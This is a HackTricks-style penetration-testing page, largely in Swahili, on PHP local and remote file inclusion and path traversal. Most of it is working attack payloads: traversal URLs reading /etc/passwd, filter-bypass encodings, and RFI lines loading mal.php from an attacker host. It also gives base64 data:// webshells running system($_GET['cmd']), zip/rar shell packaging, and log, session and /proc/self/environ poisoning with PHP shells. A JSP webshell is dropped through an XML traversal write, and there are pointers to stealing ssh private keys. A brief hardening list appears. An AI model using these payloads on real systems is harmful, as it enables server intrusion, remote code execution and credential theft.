# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Faili inasomwa kutoka kwa server ya mbali (Bora: Unaweza kuandika msimbo na server itauitekeleza). Katika php hii ni **imezimwa** kwa default (**allow_url_include**).\
**Local File Inclusion (LFI):** Server inapakia faili ya ndani.

Udhaifu hutokea wakati mtumiaji anaweza kwa njia fulani kudhibiti faili itakayopakiwa na server.

Zilizo hatarini **PHP functions**: require, require_once, include, include_once

Chombo kizuri cha ku-exploit udhaifu huu: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Nimechanganya orodha kadhaa za \*nix LFI na kuongeza njia zaidi, nimeunda hii:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Pia jaribu kubadilisha `/` kwa `\`\
Pia jaribu kuongeza `../../../../../`

Orodha inayotumia mbinu mbalimbali kupata faili /etc/password (kuangalia kama udhaifu upo) inaweza kupatikana [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Muungano wa wordlists tofauti:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Pia jaribu kubadilisha `/` kwa `\`\
Pia jaribu kuondoa `C:/` na kuongeza `../../../../../`

Orodha inayotumia mbinu mbalimbali kupata faili /boot.ini (kuangalia kama udhaifu upo) inaweza kupatikana [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Kagua orodha ya LFI ya linux.

## Misingi ya LFI na bypasses

Mifano yote ni kwa Local File Inclusion lakini pia inaweza kutumika kwa Remote File Inclusion (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences zilizokatwa bila kurudi kwa msururu
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass kuongezwa kwa chars mwishoni mwa string iliyotolewa (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Hii **imetatuliwa tangu PHP 5.4**

### **Kodishaji**

Unaweza kutumia kodishaji zisizo za kawaida kama double URL encode (na nyingine):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Kutoka kwenye folda iliyopo

Labda back-end inakagua njia ya folda:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Kuchunguza Saraka za Mfumo wa Faili kwenye Server

Mfumo wa faili wa server unaweza kuchunguzwa kwa njia ya kurudia ili kubaini saraka, sio tu faili, kwa kutumia mbinu fulani. Mchakato huu unahusisha kubaini kina cha saraka na kuchunguza kuwepo kwa folda maalum. Hapa chini kuna njia ya kina ya kufanikisha hili:

1. **Determine Directory Depth:** Tambua kina cha saraka yako ya sasa kwa kupata kwa mafanikio faili ya `/etc/passwd` (inatumika ikiwa server ni Linux-based). Mfano wa URL unaweza kuundwa kama ifuatavyo, ukiashiria kina cha tatu:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Probe for Folders:** Ongeza jina la folda inayoshukiwa (kwa mfano, `private`) kwenye URL, kisha rudi kwa `/etc/passwd`. Ngazi ya directory ya ziada inahitaji kuongeza depth kwa moja:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Tafsiri Matokeo:** Jibu la server linaonyesha kama folda ipo:
- **Error / No Output:** Inawezekana folda `private` haipo mahali ulioletwa.
- **Contents of `/etc/passwd`:** Uwepo wa folda `private` umethibitishwa.
4. **Uchunguzi Rekursivu:** Folda zilizogunduliwa zinaweza kuchunguzwa zaidi kwa folda ndogo au faili kwa kutumia mbinu ile ile au mbinu za kawaida za Local File Inclusion (LFI).

Kwa kuchunguza folda katika maeneo tofauti ya mfumo wa faili, rekebisha payload ipasavyo. Kwa mfano, ili kuangalia kama `/var/www/` ina folda `private` (ikiwa current directory iko kwa kina cha 3), tumia:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation ni mbinu inayotumiwa kubadilisha njia za faili katika maombi ya wavuti. Mara nyingi hutumika kufikia faili zilizozuiliwa kwa kuruka hatua fulani za usalama ambazo zinaongeza alama za ziada mwishoni mwa njia za faili. Lengo ni kuunda njia ya faili ambayo, mara itakapo badilishwa na hatua ya usalama, bado itaelekeza kwenye faili inayotakiwa.

Katika PHP, uwakilishi mbalimbali wa njia ya faili unaweza kuzingatiwa sawa kutokana na asili ya mfumo wa faili. Kwa mfano:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` zote zinachukuliwa kuwa njia moja.
- Wakati herufi 6 za mwisho ni `passwd`, kuongezea a `/` (kufanya `passwd/`) hakubadilishi faili inayolengwa.
- Vivyo vivyo, ikiwa `.php` inaongezwa kwenye njia ya faili (kwa mfano `shellcode.php`), kuongeza `/.` mwishoni haitabadilishi faili inayofikiwa.

Mifano iliyopewa inaonyesha jinsi ya kutumia path truncation kufikia `/etc/passwd`, lengo la kawaida kutokana na maudhui yake nyeti (taarifa za akaunti za watumiaji):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Katika matukio haya, idadi ya traversals zinazohitajika inaweza kuwa takriban 2027, lakini nambari hii inaweza kutofautiana kulingana na usanidi wa seva.

- **Using Dot Segments and Additional Characters**: Mfululizo wa traversal (`../`) ukichanganywa na sehemu za dot za ziada na herufi unaweza kutumika kuvinjari mfumo wa faili, kwa ufanisi kupuuza mnyororo uliowekwa na seva.
- **Determining the Required Number of Traversals**: Kupitia jaribio na makosa, mtu anaweza kupata idadi kamili ya mfululizo wa `../` zinazohitajika kufika kwa directory ya mzizi na kisha kwa `/etc/passwd`, kuhakikisha kwamba nyongeza yoyote iliyowekwa (kama `.php`) inafutwa lakini njia inayotakiwa (`/etc/passwd`) inabaki sawa.
- **Starting with a Fake Directory**: Ni desturi ya kawaida kuanza njia na directory isiyo ya kweli (kama `a/`). Mbinu hii hutumika kama tahadhari au kutimiza mahitaji ya mantiki ya seva ya kuchanganua njia.

Unapotumia path truncation techniques, ni muhimu kuelewa tabia ya seva ya kuchanganua njia na muundo wa filesystem. Kila hali inaweza kuhitaji mbinu tofauti, na mara nyingi upimaji unahitajika kugundua mbinu yenye ufanisi zaidi.

**Udhaifu huu ulirekebishwa katika PHP 5.3.**

### **Njia za kuzunguka kichujio**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

Katika php hii imezimwa kwa chaguo-msingi kwa sababu **`allow_url_include`** iko **Off.** Inapaswa kuwa **On** ili ifanye kazi, na katika kesi hiyo unaweza kujumuisha faili ya PHP kutoka kwenye server yako na kupata RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Ikiwa kwa sababu fulani **`allow_url_include`** iko **On**, lakini PHP ina **filtering** ya upatikanaji wa kurasa za nje, [kulingana na chapisho hili](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), unaweza kutumia kwa mfano data protocol pamoja na base64 ili ku-decoda msimbo wa PHP wa b64 na kupata RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> Katika code iliyotangulia, `+.txt` ya mwisho iliongezwa kwa sababu mshambulizi alihitaji string ambayo ilihitimisha kwa `.txt`, kwa hivyo string inahitimisha nayo na baada ya b64 decode sehemu hiyo itarudisha takataka tu na PHP code halisi itajumuishwa (na kwa hiyo, itatekelezwa).

Mfano mwingine **usiotumia `php://` protocol** ungekuwa:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Elementi ya Root ya Python

Katika Python, katika msimbo kama huu:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Ikiwa mtumiaji atatoa **absolute path** kwa **`file_name`**, **previous path** inafutwa tu:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Hii ni tabia iliyokusudiwa kulingana na [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Ikiwa sehemu ni njia kamili, sehemu zote zilizotangulia zinatupwa na kuunganisha kunaendelea kutoka kwenye sehemu ya njia kamili.

## Java Orodhesha madirektori

Inaonekana kwamba ikiwa una Path Traversal katika Java na unauliza **folda** badala ya faili, **orodha ya folda itarudishwa**. Hii haitatokee katika lugha nyingine (kwa kadiri ninavyojua).

## Vigezo 25 vya Juu

Hapa kuna orodha ya vigezo 25 vya juu ambavyo vinaweza kuwa dhaifu kwa local file inclusion (LFI) (kutoka [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI kutumia PHP wrappers & protocols

### php://filter

PHP filters zinaruhusu kufanya operesheni za msingi za **mabadiliko kwenye data** kabla ya data kusomwa au kuandikwa. Kuna aina 5 za filters:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Ondoa tags kutoka kwenye data (kila kitu kati ya "<" na ">" chars)
- Kumbuka kuwa chujio hiki kimeondoka katika matoleo ya kisasa ya PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Hubadilisha kuwa encoding tofauti (`convert.iconv.<input_enc>.<output_enc>`). Ili kupata **orodha ya encodings zote** zinazotumika endesha kwenye console: `iconv -l`

> [!WARNING]
> Kwa kutumia vibaya chujio cha `convert.iconv.*` unaweza **kutengeneza maandishi yoyote**, ambayo inaweza kuwa muhimu kuandika maandishi yoyote au kufanya include process isimamie maandishi yoyote. Kwa habari zaidi angalia [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Compress the content (useful if exfiltrating a lot of info)
- `zlib.inflate`: Decompress the data
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Deprecated
- `mdecrypt.*` : Deprecated
- Other Filters
- Ukiendesha katika php `var_dump(stream_get_filters());` utaona baadhi ya **vichujio visivyotarajiwa**:
- `consumed`
- `dechunk`: inarudisha nyuma HTTP chunked encoding
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Sehemu "php://filter" haizingatii tofauti za herufi

### Kutumia php filters kama oracle kusoma faili yoyote

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) inapendekeza mbinu ya kusoma faili ya ndani bila server kurudisha yaliyomo. Mbinu hii inategemea **boolean exfiltration of the file (char by char) using php filters** kama oracle. Hii ni kwa sababu php filters zinaweza kutumika kuongeza maandishi kiasi cha kutosha kushinikiza php kutoa hitilafu.

Katika post ya asili unaweza kupata maelezo ya kina ya mbinu hii, lakini hapa kuna muhtasari mfupi:

- Tumia codec **`UCS-4LE`** kuweka herufi ya mwanzo ya maandishi mwanzoni na kufanya ukubwa wa string ukuwe kwa kiasi kinachoongezeka kwa kasi (exponentially).
- Hii itatumika kuzalisha **maandishi makubwa sana wakati herufi ya mwanzo itakaponikuliwa kwa usahihi** kiasi kwamba php itasababisha **error**.
- Filter ya **dechunk** itafuta kila kitu **ikiwa char ya kwanza si hexadecimal**, hivyo tunaweza kujua ikiwa char ya kwanza ni hex.
- Hii, ikichanganywa na iliyo hapo awali (na filters nyingine kulingana na herufi iliyokisiwa), itatuwezesha kukisia herufi mwanzoni mwa maandishi kwa kuona wakati tunapofanya mabadiliko ya kutosha kuifanya isiwe herufi ya hexadecimal. Kwa kuwa ikiwa ni hex, dechunk haitafuta na mlipuko wa awali utasababisha php error.
- Codec **convert.iconv.UNICODE.CP930** hubadilisha kila herufi kuwa ile inayofuata (kwa hivyo baada ya codec hii: a -> b). Hii inaturuhusu kugundua ikiwa herufi ya kwanza ni `a` kwa mfano kwa sababu ikiwa tutaweka codec hii 6 mara a->b->c->d->e->f->g herufi haitakuwa tena tabia ya hexadecimal, kwa hivyo dechunk haitaiangusha na php error itasababisha kwa sababu inazidisha na initial bomb.
- Kwa kutumia mabadiliko mingine kama **rot13** mwanzoni inawezekana leak herufi nyingine kama n, o, p, q, r (na codecs nyingine zinaweza kutumika kuhamisha herufi nyingine kwenye eneo la hex).
- Wakati char ya mwanzo ni namba inahitajika kui-base64 encode na leak herufi 2 za kwanza ili leak namba hiyo.
- Tatizo la mwisho ni kuona **jinsi ya leak zaidi ya herufi ya mwanzo**. Kwa kutumia order memory filters kama **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** inawezekana kubadilisha mpangilio wa chars na kupata mahali pa kwanza herufi nyingine za maandishi.
- Na ili kuwaze kupata **further data** wazo ni **kutengeneza 2 bytes za junk data mwanzoni** kwa kutumia **convert.iconv.UTF16.UTF16**, tumia **UCS-4LE** kuzifanya zi**pivot with the next 2 bytes**, na d**elete the data until the junk data** (hii itaondoa bytes 2 za mwanzo za maandishi ya awali). Endelea kufanya hivyo hadi utakapofikia sehemu unayotaka leak.

Katika post pia ilileak zana ya kufanya hili moja kwa moja: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

This wrapper inaruhusu kufikia file descriptors ambazo process imefungua. Inaweza kuwa muhimu ku-exfiltrate yaliyomo ya faili zilizofunguliwa:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Unaweza pia kutumia **php://stdin, php://stdout and php://stderr** kufikia **file descriptors 0, 1 and 2** mtawalia (Sijui jinsi hii ingefaa katika attack)

### zip:// and rar://

Pakia faili la Zip au Rar lenye PHPShell ndani na ufikie.\
Ili kuweza abuse the rar protocol, inahitaji **kuwezeshwa mahsusi**
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Kumbuka kwamba protokoli hii inadhibitiwa na usanidi wa php **`allow_url_open`** na **`allow_url_include`**

### expect://

Expect inapaswa kuwa imewezeshwa. Unaweza kutekeleza msimbo kwa kutumia hii:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Taja payload yako katika POST parameters:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Faili la `.phar` linaweza kutumika kutekeleza PHP code wakati programu ya wavuti inapotumia function kama `include` kwa ajili ya kupakia faili. Kipande cha PHP cha chini kinaonyesha uundaji wa faili la `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Ili ku-compile faili la `.phar`, amri ifuatayo inapaswa kutekelezwa:
```bash
php --define phar.readonly=0 create_path.php
```
Upon execution, a file named `test.phar` will be created, which could potentially be leveraged to exploit Local File Inclusion (LFI) vulnerabilities.

Katika kesi ambapo LFI inafanya tu kusoma faili bila kutekeleza msimbo wa PHP ndani yake, kupitia functions such as `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, or `filesize()`, inaweza kujaribu exploitation ya deserialization vulnerability. Udhaifu huu unahusiana na kusoma faili kwa kutumia protocol ya `phar`.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Ilikuwa inawezekana kutumia vibaya **any arbitrary file read from PHP that supports php filters** kupata RCE. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Muhtasari mfupi: **3 byte overflow** katika PHP heap ilitumiwa vibaya ili **alter the chain of free chunks** za ukubwa maalum ili kuweza **write anything in any address**, hivyo hook iliongezwa kuitisha **`system`**.\
Ilikuwa inawezekana ku-alloc chunks za ukubwa maalum kwa kutumia zaidi php filters.

### More protocols

Angalia zaidi[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Andika katika memory au katika faili ya muda (sidhani jinsi hii inaweza kuwa muhimu katika file inclusion attack)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Kupata filesystem ya eneo
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Kupata HTTP(s) URLs
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Kupata FTP(s) URLs
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Mtiririko ya compression
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Find pathnames matching pattern (Hairejeshi chochote kinachoweza kuchapishwa, hivyo sio muhimu hapa)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio streams (Si muhimu kusoma arbitrary files)

## LFI via PHP's 'assert'

Hatari za Local File Inclusion (LFI) katika PHP ni kubwa hasa wakati wa kushughulikia function ya 'assert', ambayo inaweza kutekeleza msimbo ndani ya strings. Hii ni tatizo hasa ikiwa input inayojumuisha characters za directory traversal kama ".." inakaguliwa lakini haijasafishwa ipasavyo.

Kwa mfano, msimbo wa PHP unaweza kubuniwa kuzuia directory traversal kama ifuatavyo:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Ingawa hili linalenga kuzuia traversal, kwa bahati mbaya linaunda vector kwa ajili ya code injection. Ili kuvitumia kusoma file contents, attacker anaweza kutumia:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Kwa njia sawa, kwa kutekeleza amri yoyote za mfumo, mtu anaweza kutumia:
```plaintext
' and die(system("id")) or '
```
Ni muhimu **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Mbinu hii inafaa katika kesi ambapo wewe unadhibiti **file path** ya **PHP function** ambayo ita **access a file** lakini hutaona yaliyomo ya faili (kama simu rahisi ya **`file()`**) kwani yaliyomo hayajaonyeshwa.

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) imeelezwa jinsi blind path traversal inaweza kutumiwa via PHP filter ili **exfiltrate the content of a file via an error oracle**.

Kwa muhtasari, mbinu inatumia **"UCS-4LE" encoding** kufanya yaliyomo ya faili kuwa **big** kiasi kwamba **PHP function opening** faili itasababisha **error**.

Kisha, ili leak the first char filter **`dechunk`** inatumiwa pamoja na nyingine kama **base64** au **rot13** na hatimaye filters **convert.iconv.UCS-4.UCS-4LE** na **convert.iconv.UTF16.UTF-16BE** zinatumika ili **place other chars at the beggining and leak them**.

Functions ambazo zinaweza kuwa hatarini: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Kwa maelezo ya kiufundi angalia post uliotajwa!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Wakati code ya server-side inayokubali/uploads faili inajenga destination path kwa kutumia data inayodhibitiwa na mtumiaji (mfano, jina la faili au URL) bila canonicalising na validating, `..` segments na absolute paths zinaweza kutoroka kutoka kwenye directory iliyokusudiwa na kusababisha arbitrary file write. Ikiwa unaweza kuweka payload chini ya web-exposed directory, kwa kawaida unapata unauthenticated RCE kwa kuacha webshell.

Typical exploitation workflow:
- Tambua write primitive katika endpoint au background worker inayokubali path/filename na kuandika yaliyomo kwenye disk (mfano, message-driven ingestion, XML/JSON command handlers, ZIP extractors, n.k.).
- Tambua web-exposed directories. Common examples:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Tengeneza traversal path inayovunja kutoka kwenye intended storage directory hadi webroot, na jumuisha yaliyomo ya webshell yako.
- Tembelea payload ulioweka na utekeleze amri.

Vidokezo:
- The vulnerable service that performs the write may listen on a non-HTTP port (e.g., a JMF XML listener on TCP 4004). The main web portal (different port) will later serve your payload.
- Kwenye Java stacks, uandishi huu wa faili mara nyingi hufanywa kwa simple `File`/`Paths` concatenation. Ukosefu wa canonicalisation/allow-listing ndiko kasoro kuu.

Generic XML/JMF-style example (product schemas zinatofautiana – DOCTYPE/body wrapper haina umuhimu kwa traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Uimarishaji unaofanya kazi dhidi ya aina hii ya hitilafu:
- Weka njia hadi canonical path na udhibiti kwamba ni mrithi wa saraka ya msingi iliyoorodheshwa.
- Kataa njia yoyote inayojumuisha `..`, absolute roots, au drive letters; pendelea generated filenames.
- Endesha mchakato wa kuandika kama akaunti yenye ruhusa ndogo na tofautisha saraka za kuandika kutoka kwa served roots.

## Remote File Inclusion

Imeelezewa hapo awali, [**follow this link**](#remote-file-inclusion).

### Kupitia faili za logi za Apache/Nginx

Iwapo server ya Apache au Nginx iko **vulnerable to LFI** ndani ya include function unaweza kujaribu kufikia **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, kuweka ndani ya **user agent** au ndani ya **GET parameter** php shell kama **`<?php system($_GET['c']); ?>`** na ku-include faili hilo

> [!WARNING]
> Kumbuka kwamba **kama utatumia double quotes** kwa shell badala ya **simple quotes**, double quotes zitabadilishwa kwa string "_**quote;**_", **PHP itatoa kosa** hapo na **hakutakuwa na chochote kingine kitakachotekelezwa**.
>
> Pia, hakikisha **unaandika payload kwa usahihi** au PHP itatoa kosa kila mara itakapo jaribu kupakia faili ya log na hautakuwa na fursa ya pili.

Hii pia inaweza kufanywa katika logi nyingine lakini **kuwa mwangalifu,** code ndani ya logi inaweza kuwa URL encoded na hii inaweza kuharibu Shell. Header **authorisation "basic"** ina "user:password" katika Base64 na inachanganuliwa ndani ya logi. PHPShell inaweza kuingizwa ndani ya header hii.\
Njia nyingine zinazowezekana za logi:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Kupitia Email

**Tuma barua** kwa akaunti ya ndani (user@localhost) ikiwa na PHP payload yako kama `<?php echo system($_REQUEST["cmd"]); ?>` na jaribu ku-include barua ya mtumiaji kwa njia kama **`/var/mail/<USERNAME>`** au **`/var/spool/mail/<USERNAME>`**

### Kupitia /proc/*/fd/*

1. Upload a lot of shells (kwa mfano: 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), with $PID = PID ya process (can be brute forced) na $FD ni file descriptor (can be brute forced too)

### Kupitia /proc/self/environ

Kama log file, tuma payload katika User-Agent, itaonekana ndani ya /proc/self/environ file
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Kupitia upload

Ikiwa unaweza upload faili, ingiza tu shell payload ndani yake (e.g : `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Ili kufanya faili kusomeka vizuri ni bora kuingiza kwenye metadata ya picha/doc/pdf

### Kupitia Zip fie upload

Pakia ZIP file inayojumuisha PHP shell iliyobanwa kisha ufikie:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Kupitia PHP sessions

Angalia ikiwa tovuti inatumia PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
Katika PHP vikao hivi vinahifadhiwa ndani ya _/var/lib/php5/sess\\_\[PHPSESSID]\_ mafaili
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Weka cookie kuwa `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Tumia LFI kujumuisha faili ya session ya PHP
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Kupitia ssh

Ikiwa ssh imewekwa, angalia ni mtumiaji gani anayetumika (/proc/self/status & /etc/passwd) na jaribu kufikia **\<HOME>/.ssh/id_rsa**

### **Kupitia** **vsftpd** _**logs**_

Logi za server ya FTP vsftpd ziko katika _**/var/log/vsftpd.log**_. Katika tukio ambapo kuna udhaifu wa Local File Inclusion (LFI), na ufikiaji wa server ya vsftpd iliyofichuliwa unapatikana, hatua zifuatazo zinaweza kuzingatiwa:

1. Inject PHP payload kwenye uwanja wa username wakati wa mchakato wa login.
